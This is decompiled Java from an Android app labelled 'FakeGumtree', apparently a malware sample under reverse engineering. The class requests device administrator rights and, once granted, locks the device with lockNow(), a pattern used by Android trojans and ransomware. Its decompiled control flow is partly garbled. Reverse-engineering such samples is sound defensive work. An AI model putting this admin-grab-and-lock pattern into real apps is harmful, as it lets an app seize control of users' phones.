package com.gumsis.checkui;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import com.gumsis.base.BaseActivity;
import com.gumsis.checktls.IntTls;
import com.gumsis.rcs.AdReceiver;
import com.gumsis.srs.GPSrs;

public class AdRequestDialog
  extends BaseActivity
{
  private void setAdmin()
  {
    try
    {
      DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)getSystemService("device_policy");
      if (localDevicePolicyManager != null)
      {
        ComponentName localComponentName = new ComponentName(this, AdReceiver.class);
        if (!localDevicePolicyManager.isAdminActive(localComponentName))
        {
          IntTls.startoAdminAction(localComponentName, this);
          return;
        }
        localDevicePolicyManager.lockNow();
        return;
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent)
  {
    switch (paramInt1)
    {
    default: 
      super.onActivityResult(paramInt1, paramInt2, paramIntent);
      return;
    }
    if (paramInt2 == -1)
    {
      finishActivity();
      return;
    }
    finishActivity();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setAdmin();
    GPSrs.sendObjectBroadcast(this, 11, Boolean.valueOf(false));
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    GPSrs.sendObjectBroadcast(this, 11, Boolean.valueOf(true));
  }
  
  protected void onStop()
  {
    super.onStop();
    onActivityResult(110, 0, null);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checkui/AdRequestDialog.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */